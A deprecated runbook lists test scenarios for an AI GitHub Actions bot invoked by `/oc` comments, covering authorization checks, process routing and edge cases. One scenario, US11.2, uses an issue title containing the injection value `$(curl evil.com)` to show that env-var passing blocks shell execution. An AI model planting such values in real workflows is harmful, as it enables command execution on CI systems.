# RUNBOOK — OpenCode Actions Simulation Guide

> **DEPRECATED:** the `/oc` pipeline workflows (`opencode-pr-review.yml`,
> `opencode-pr-comment.yml`, `opencode-issue-handler.yml`) have been deleted.
> This runbook is retained for historical reference only.

This document describes every realistic user interaction with the OpenCode
automation system. Each User Story (US) includes preconditions, step-by-step
actions, and the expected system behavior.

## User Roles

| Role | Definition | `author_association` |
|------|------------|----------------------|
| **Known** | Has write or admin access to the repository | `OWNER`, `MEMBER`, `COLLABORATOR` |
| **Unknown** | No direct access — outside contributor, random user, or fork PR author | `NONE`, `CONTRIBUTOR`, `FIRST_TIME_CONTRIBUTOR` |

---

> **Security note:** All `/oc` command bodies are passed through `env:`
> variables (not inline `${{ toJSON() }}`) to prevent shell injection.
> Issue titles are also passed via env vars to prevent command substitution
> in generated branch names and PR titles.

## US01 — Unknown user opens an issue

**Preconditions:** None.

- [ ] Unknown user navigates to the repository and opens a new issue.
- [ ] Issue is created with title, description, and labels.
- [ ] **Expected:** No workflow fires. The issue sits in the triage queue with
      no automated response.

**Why:** All OpenCode workflows trigger on `issue_comment`, not `issues: opened`.
Opening an issue never invokes the automation.

---

## US02 — Known user opens an issue

**Preconditions:** User has `OWNER`, `MEMBER`, or `COLLABORATOR` association.

- [ ] Known user opens a new issue with title and description.
- [ ] **Expected:** No workflow fires. Same as US01 — issue creation alone
      does not trigger any automation.

**Why:** The user must explicitly invoke `/oc` via a comment to start any
process.

---

## US03 — Unknown user opens a PR

**Preconditions:** Unknown user has pushed a branch and opened a pull request.

- [ ] Unknown user opens a PR against `main`.
- [ ] PR is created with title and description.
- [ ] **Expected:** No workflow fires. No automatic review, no comments.

**Why:** The old `opencode-review.yaml` (auto-review on PR events) was removed.
All new workflows require an explicit `/oc` comment.

---

## US04 — Known user opens a PR

**Preconditions:** User has `OWNER`, `MEMBER`, or `COLLABORATOR` association.

- [ ] Known user opens a PR against `main`.
- [ ] **Expected:** No workflow fires. Same as US03.

**Why:** No automatic review is configured. The user must comment `/oc` to
request a review.

---

## US05 — Unknown user comments `/oc` on an issue or PR

**Preconditions:** An issue or PR exists (open state). The commenter has
no `OWNER`, `MEMBER`, or `COLLABORATOR` association.

### US05.1 — Unknown user comments `/oc` on an issue

- [ ] Unknown user posts a comment containing `/oc` on an open issue.
- [ ] `opencode-issue-handler.yml` fires but the `route` job `if` condition
      fails because `author_association` is not in `["OWNER", "MEMBER", "COLLABORATOR"]`.
- [ ] **Expected:** The job is skipped entirely. No AI is invoked. No comment
      is posted.

### US05.2 — Unknown user comments `/oc` on a PR

- [ ] Unknown user posts `/oc` on a PR's timeline (issue_comment).
- [ ] `opencode-pr-review.yml` fires but the `review` job `if` condition
      fails on the authorization check.
- [ ] `opencode-pr-comment.yml` fires but the `route` job `if` condition
      fails on the authorization check **and** the PR guard
      (`github.event.issue.pull_request`).
- [ ] **Expected:** Both workflows skip. No AI runs. No review is posted.

### US05.3 — Unknown user comments `/oc implement` on an issue

- [ ] Same as US05.1 but with `/oc implement add login page`.
- [ ] **Expected:** Blocked. No branch is created. No PR is opened.

### US05.4 — Unknown user comments `/oc task fix bug` on a PR

- [ ] Same as US05.2 but with `/oc task fix the login bug`.
- [ ] **Expected:** Blocked. No code is pushed. No checkbox is updated.

**Why:** Every workflow checks `author_association` in the job-level `if`
condition. Unknown users are rejected before any step runs.

---

## US06 — Unknown user asks to review an issue or PR

**Preconditions:** An issue or PR exists (open state). The commenter is
unknown.

### US06.1 — Unknown user comments `/oc review` on an issue

- [ ] Unknown user posts `/oc review` on an open issue.
- [ ] `opencode-issue-handler.yml` fires. `route` job skips (unauthorized).
- [ ] **Expected:** No analysis is posted. The issue timeline remains empty.

### US06.2 — Unknown user comments `/oc review` on a PR

- [ ] Unknown user posts `/oc review` on a PR timeline.
- [ ] `opencode-pr-review.yml` fires. `review` job skips (unauthorized).
- [ ] **Expected:** No code review is submitted. No inline comments appear.

### US06.3 — Unknown user posts `/oc` in a PR inline review thread

- [ ] Unknown user posts `/oc` as a `pull_request_review_comment` on a code
      line in a PR.
- [ ] `opencode-pr-comment.yml` fires. `route` job skips (unauthorized).
- [ ] **Expected:** No response is generated.

**Why:** Same authorization gate as US05. The AI is never invoked for
unauthorized users.

---

## US07 — Known user asks to review an issue or PR

**Preconditions:** User has `OWNER`, `MEMBER`, or `COLLABORATOR` association.
An issue or PR exists (open state).

### US07.1 — Known user comments `/oc` on an issue

- [ ] Known user posts `/oc` on an open issue.
- [ ] `opencode-issue-handler.yml` fires. `route` job passes authorization.
- [ ] `parse` step runs `auth.sh` → `SUBCOMMAND=discuss`.
- [ ] `route` step sets `process=process-4`.
- [ ] `process-4` job runs opencode with Process 4 prompt.
- [ ] **Expected:** Opencode reads the issue, analyzes it, and posts a
      comment with:
      - Analysis of the request
      - Gaps or clarifying questions
      - Proposed approach (no code changes)
      - Next steps

### US07.2 — Known user comments `/oc review` on an issue

- [ ] Known user posts `/oc review` on an open issue.
- [ ] `opencode-issue-handler.yml` fires. `auth.sh` → `SUBCOMMAND=review`.
- [ ] `route` step sets `process=process-4` (review maps to discuss).
- [ ] `process-4` job runs.
- [ ] **Expected:** Same as US07.1 — read-only analysis posted as a comment.

### US07.3 — Known user comments `/oc` on a PR

- [ ] Known user posts `/oc` on a PR's timeline (issue_comment).
- [ ] `opencode-pr-review.yml` fires. `review` job `if` condition passes:
      - `github.event.issue.pull_request` is truthy ✓
      - Not a bot ✓
      - Authorized ✓
      - PR is open ✓
      - Starts with `/oc` ✓
      - Does NOT contain `/oc task` ✓
      - Does NOT contain `/oc implement` ✓
- [ ] `pr-check` step verifies PR is not a draft.
- [ ] opencode runs Process 1 prompt.
- [ ] **Expected:** Opencode submits a formal PR review with:
      - Resolved outdated review threads (if applicable)
      - Inline comments with category labels (🚨/⚡/🛠️/💡)
      - `suggestion` blocks for concrete fixes
      - Review verdict (APPROVE / REQUEST_CHANGES / COMMENT)

### US07.4 — Known user comments `/oc review` on a PR

- [ ] Same as US07.3 but with explicit `/oc review`.
- [ ] **Expected:** Identical to US07.3 — full code review with inline threads.

### US07.5 — Known user comments `/oc` on a draft PR

- [ ] Known user posts `/oc` on a PR that is in draft state.
- [ ] `opencode-pr-review.yml` fires. `review` job `if` condition passes
      (draft check is not in the `if` — it's checked in a step).
- [ ] `pr-check` step detects `IS_DRAFT=true`, sets `skip=true`.
- [ ] **Expected:** The opencode step is skipped. No review is posted.
      A `::warning::` annotation appears in the job log.

### US07.6 — Known user comments `/oc` on a PR with only trivial changes

- [ ] Known user posts `/oc` on a PR that only changes `.md`, `.json`, or
      image files (no code).
- [ ] **Expected:** The review proceeds (the trivial-check was part of the
      old auto-review workflow; Process 1 does not include it). The AI
      reviews the diff regardless.

**Why:** Process 1 (`opencode-pr-review.yml`) handles all `/oc` and
`/oc review` commands on PR timelines. Process 4 (`opencode-issue-handler.yml`)
handles the same commands on issues.

---

## US08 — Unknown user asks to implement an issue or PR

**Preconditions:** An issue or PR exists (open state). The commenter is
unknown.

### US08.1 — Unknown user comments `/oc implement add dark mode` on an issue

- [ ] Unknown user posts `/oc implement add dark mode` on an open issue.
- [ ] `opencode-issue-handler.yml` fires. `route` job skips (unauthorized).
- [ ] **Expected:** No branch is created. No PR is opened. No code is
      modified.

### US08.2 — Unknown user comments `/oc task fix login` on a PR

- [ ] Unknown user posts `/oc task fix login` on a PR.
- [ ] `opencode-pr-comment.yml` fires. `route` job skips (unauthorized).
- [ ] **Expected:** No code is pushed. No checkbox is updated.

**Why:** Same authorization gate. The implement/task commands require
known-user status.

---

## US09 — Known user asks to implement an issue, PR, or discussion

**Preconditions:** User has `OWNER`, `MEMBER`, or `COLLABORATOR` association.
An issue or PR exists (open state).

### US09.1 — Known user comments `/oc implement add login page` on an issue

- [ ] Known user posts `/oc implement add login page` on an open issue.
- [ ] `opencode-issue-handler.yml` fires. `route` job passes authorization.
- [ ] `auth.sh` parses → `SUBCOMMAND=implement`, `TASK_ARGS=add login page`.
- [ ] `route` step sets `process=process-5`.
- [ ] `process-5` job runs opencode with Process 5 prompt.
- [ ] Opencode reads the issue body and comments.
- [ ] Opencode determines the default branch (`main`).
- [ ] Opencode creates a feature branch:
      `opencode/issue-42-add-login-page`.
- [ ] Opencode implements the feature.
- [ ] Opencode updates `CHANGELOG.md`.
- [ ] Opencode commits and pushes the branch.
- [ ] Opencode creates a PR with body containing:
      - `Resolves #42`
      - Summary of changes
      - Task checklist (`- [ ] Task 1`, `- [ ] Task 2`, etc.)
- [ ] Opencode posts a comment on the issue linking to the new PR.
- [ ] **Expected:** A new PR exists with implementation commits, linked to
      the original issue.

### US09.2 — Known user comments `/oc implement` without additional info on an issue

- [ ] Known user posts just `/oc implement` (no trailing text) on an issue.
- [ ] `auth.sh` parses → `SUBCOMMAND=implement`, `TASK_ARGS=` (empty).
- [ ] `process-5` runs.
- [ ] **Expected:** Opencode reads only the issue body for requirements. If
      the issue is well-defined, it proceeds. If ambiguous, it posts a
      comment explaining what's missing and stops without creating a branch.

### US09.3 — Known user comments `/oc task implement the login form` on a PR

- [ ] Known user posts `/oc task implement the login form` on a PR.
- [ ] `opencode-pr-comment.yml` fires. `route` job passes authorization.
- [ ] `auth.sh` parses → `SUBCOMMAND=task`, `TASK_ARGS=implement the login form`.
- [ ] `route` step sets `process=process-6`.
- [ ] `process-6` job checks out the PR branch.
- [ ] Opencode searches the PR description for a matching `- [ ]` task.
- [ ] Opencode implements the matched task.
- [ ] Opencode commits and pushes.
- [ ] Opencode updates the PR body: flips `- [ ] implement the login form`
      to `- [x] implement the login form`.
- [ ] Opencode posts a summary comment with commit reference.
- [ ] **Expected:** The targeted task is completed. The PR branch has new
      commits. The checklist is updated.

### US09.4 — Known user comments `/oc task` (no arguments) on a PR

- [ ] Known user posts `/oc task` with no additional text on a PR.
- [ ] `auth.sh` parses → `SUBCOMMAND=task`, `TASK_ARGS=` (empty).
- [ ] `route` step sets `process=process-6`.
- [ ] `process-6` runs. Opencode parses the PR body.
- [ ] Opencode finds the first `- [ ]` item in the task checklist.
- [ ] Opencode implements that item.
- [ ] **Expected:** The first unchecked task in the PR description is
      implemented and checked off.

### US09.5 — Known user comments `/oc task` but all tasks are completed

- [ ] Known user posts `/oc task` on a PR where all `- [ ]` items are
      already `- [x]`.
- [ ] `process-6` runs. Opencode finds no unchecked tasks.
- [ ] **Expected:** Opencode posts a comment: "All tasks in the PR
      description are already completed. Nothing to do."

### US09.6 — Known user comments `/oc implement` on a PR (not an issue)

- [ ] Known user posts `/oc implement add dark mode` on a PR's timeline.
- [ ] `opencode-issue-handler.yml` fires. The `route` job `if` condition
      checks `!github.event.issue.pull_request` — this is truthy for PRs,
      so the condition `!github.event.issue.pull_request` is FALSE.
- [ ] **Expected:** The `route` job is skipped. `/oc implement` on a PR
      timeline does nothing. The user should use `/oc task` instead.

**Why:** Process 5 (Issue Work) is designed for issues only — it creates
branches and PRs. Process 6 (PR Task) handles targeted work on existing PRs.

---

## US10 — Known and unknown users respond to a comment in a PR

**Preconditions:** A PR exists with an active review thread. The thread may
have been started by the bot (`opencode-agent[bot]`) or by a human.

### US10.1 — Unknown user replies in a bot-owned thread (no `/oc`)

- [ ] Unknown user posts a reply in a thread originally created by
      `opencode-agent[bot]`.
- [ ] `opencode-pr-comment.yml` fires on `pull_request_review_comment`.
- [ ] `route` job fails authorization check (unknown user).
- [ ] **Expected:** No response. The thread remains as-is.

### US10.2 — Known user replies in a bot-owned thread (no `/oc`)

- [ ] Known user posts a reply (e.g. "Can you explain why?") in a thread
      originally created by `opencode-agent[bot]`.
- [ ] `opencode-pr-comment.yml` fires. `route` job passes authorization.
- [ ] `auth.sh` parses → `IS_OC_COMMAND=false`, `SUBCOMMAND=none`.
- [ ] `route` step: `EVENT_NAME=pull_request_review_comment`, `IS_OC=false`
      → `PROCESS=process-2`.
- [ ] `process-2` job runs. `thread-check` verifies the parent comment was
      authored by `opencode-agent[bot]` → `is_bot_thread=true`.
- [ ] opencode runs Process 2 prompt with the thread context.
- [ ] **Expected:** Opencode replies in the thread answering the question.
      If the user asked for a fix, opencode **pushes a commit** (process-2
      has `contents: write` permission) and replies linking the commit.

### US10.3 — Unknown user replies `/oc` in a user-owned thread

- [ ] Unknown user posts `/oc` in a thread started by another human.
- [ ] `opencode-pr-comment.yml` fires. `route` job fails (unauthorized).
- [ ] **Expected:** No response. Blocked.

### US10.4 — Known user replies `/oc` in a user-owned thread

- [ ] Known user posts `/oc` in a thread started by another human.
- [ ] `opencode-pr-comment.yml` fires. `route` job passes.
- [ ] `auth.sh` → `IS_OC_COMMAND=true`, `SUBCOMMAND=discuss`.
- [ ] `route` step: `IS_OC=true` → `PROCESS=process-3`.
- [ ] `process-3` job runs opencode with Process 3 prompt.
- [ ] opencode reads the full thread history.
- [ ] **Expected:** Opencode assumes responsibility for the thread:
      - If the user asked for analysis → posts an inline reply.
      - If the user asked for a fix → checks out the branch, makes the
        change, commits, pushes, and replies with the commit ref.
      - From this point on, further replies in the thread follow
        Process 2 logic (auto-reply without `/oc`).

### US10.5 — Unknown user replies in a user-owned thread (no `/oc`)

- [ ] Unknown user posts a regular comment in a thread started by a human.
- [ ] `opencode-pr-comment.yml` fires. `route` job fails (unauthorized).
- [ ] **Expected:** No response. This is just a normal human comment.

### US10.6 — Known user replies in a bot-owned thread with `/oc task fix bug`

- [ ] Known user posts `/oc task fix bug` in a bot thread.
- [ ] `opencode-pr-comment.yml` fires. `route` passes.
- [ ] `auth.sh` → `SUBCOMMAND=task`.
- [ ] `route` step: `IS_OC=true` but `SUBCOMMAND=task` — the route logic
      for `pull_request_review_comment` sends `/oc` to `process-3`
      regardless of subcommand.
- [ ] **Expected:** Process 3 runs (thread takeover), not Process 6.
      Process 6 is only triggered via `issue_comment` (PR timeline), not
      inline review comments.

### US10.7 — Known user replies to a bot thread, then another known user
             replies later

- [ ] User A (known) replies to a bot thread (US10.2 scenario).
- [ ] Process 2 runs and opencode responds.
- [ ] User B (known) replies to the same thread later.
- [ ] `opencode-pr-comment.yml` fires again. `route` passes.
- [ ] `auth.sh` → `IS_OC_COMMAND=false` (or `true` if they use `/oc`).
- [ ] `route` determines `process-2` (bot thread reply).
- [ ] `thread-check` checks the **immediately preceding comment** (`.[-2]`
      from the comments API) — if it was from `opencode-agent[bot]`,
      `IS_BOT_THREAD=true`.
- [ ] Process 2 runs again with the updated thread context.
- [ ] **Expected:** Opencode continues the discussion, maintaining context
      from the entire thread history.

**Note:** Bot thread detection checks only the comment immediately before
the current one, not all historical bot comments. This prevents false
positives where a human comment between two bot comments would incorrectly
route to Process 2.

---

## US11 — Edge cases and input safety

**Preconditions:** Various.

### US11.1 — `/oc reviewtask` does NOT trigger Process 1

- [ ] Known user comments `/oc reviewtask please` on a PR.
- [ ] `auth.sh` parses → the `review` regex requires a word boundary
      (`$` or whitespace) after `review`, so `reviewtask` does NOT match.
- [ ] `SUBCOMMAND=discuss` (falls through to default).
- [ ] `opencode-pr-review.yml` still triggers (starts with `/oc`, not
      `/oc task` or `/oc implement`), so Process 1 runs.
- [ ] **Expected:** Process 1 runs with `SUBCOMMAND=discuss`. The AI
      treats it as a general review request.

### US11.2 — Issue title with special characters is safe

- [ ] Known user creates an issue titled: `Feature: $(curl evil.com) test``.
- [ ] Another user comments `/oc implement` on it.
- [ ] `opencode-issue-handler.yml` passes `ISSUE_TITLE` via `env:` —
      the `$(curl ...)` is NOT executed by the shell.
- [ ] The slug sanitization strips non-alphanumeric characters, producing
      `feature-curl-evilcom-test`.
- [ ] **Expected:** Branch name is `opencode/issue-42-feature-curl-evilcom-test`.
      No command execution occurs.

### US11.3 — PR guard prevents issue comments from reaching PR workflows

- [ ] Known user comments `/oc` on a plain issue (not a PR).
- [ ] `opencode-pr-comment.yml` fires on `issue_comment`.
- [ ] The `route` job `if` condition includes
      `(github.event_name != 'issue_comment' || github.event.issue.pull_request)`.
      For plain issues, this evaluates to `false`.
- [ ] **Expected:** `opencode-pr-comment.yml` skips. Only
      `opencode-issue-handler.yml` handles the comment.

---

## Summary Matrix

| US | User | Action | Target | Expected Process | Workflow |
|----|------|--------|--------|-----------------|----------|
| 01 | Unknown | Opens issue | Issue | None | — |
| 02 | Known | Opens issue | Issue | None | — |
| 03 | Unknown | Opens PR | PR | None | — |
| 04 | Known | Opens PR | PR | None | — |
| 05.1 | Unknown | `/oc` on issue | Issue | **Blocked** | — |
| 05.2 | Unknown | `/oc` on PR | PR | **Blocked** | — |
| 05.3 | Unknown | `/oc implement` on issue | Issue | **Blocked** | — |
| 05.4 | Unknown | `/oc task` on PR | PR | **Blocked** | — |
| 06.1 | Unknown | `/oc review` on issue | Issue | **Blocked** | — |
| 06.2 | Unknown | `/oc review` on PR | PR | **Blocked** | — |
| 06.3 | Unknown | `/oc` inline on PR | PR | **Blocked** | — |
| 07.1 | Known | `/oc` on issue | Issue | **Process 4** | issue-handler |
| 07.2 | Known | `/oc review` on issue | Issue | **Process 4** | issue-handler |
| 07.3 | Known | `/oc` on PR | PR | **Process 1** | pr-review |
| 07.4 | Known | `/oc review` on PR | PR | **Process 1** | pr-review |
| 07.5 | Known | `/oc` on draft PR | PR | **Skipped** (draft) | pr-review |
| 08.1 | Unknown | `/oc implement` on issue | Issue | **Blocked** | — |
| 08.2 | Unknown | `/oc task` on PR | PR | **Blocked** | — |
| 09.1 | Known | `/oc implement <info>` on issue | Issue | **Process 5** | issue-handler |
| 09.2 | Known | `/oc implement` (no args) on issue | Issue | **Process 5** | issue-handler |
| 09.3 | Known | `/oc task <task>` on PR | PR | **Process 6** | pr-comment |
| 09.4 | Known | `/oc task` (no args) on PR | PR | **Process 6** | pr-comment |
| 09.5 | Known | `/oc task` (all done) on PR | PR | **Process 6** (no-op) | pr-comment |
| 09.6 | Known | `/oc implement` on PR | PR | **Blocked** (wrong target) | — |
| 10.1 | Unknown | Reply in bot thread | PR | **Blocked** | — |
| 10.2 | Known | Reply in bot thread (no `/oc`) | PR | **Process 2** | pr-comment |
| 10.3 | Unknown | `/oc` in user thread | PR | **Blocked** | — |
| 10.4 | Known | `/oc` in user thread | PR | **Process 3** | pr-comment |
| 10.5 | Unknown | Reply in user thread (no `/oc`) | PR | None | — |
| 10.6 | Known | `/oc task` in bot thread (inline) | PR | **Process 3** (not 6) | pr-comment |
| 10.7 | Known | Reply to ongoing bot thread | PR | **Process 2** | pr-comment |
| 11.1 | Known | `/oc reviewtask` on PR | PR | **Process 1** (discuss) | pr-review |
| 11.2 | Known | `/oc implement` on issue with `$(...)` title | Issue | **Process 5** (safe) | issue-handler |
| 11.3 | Known | `/oc` on plain issue (not PR) | Issue | Skipped by pr-comment, handled by issue-handler | — |
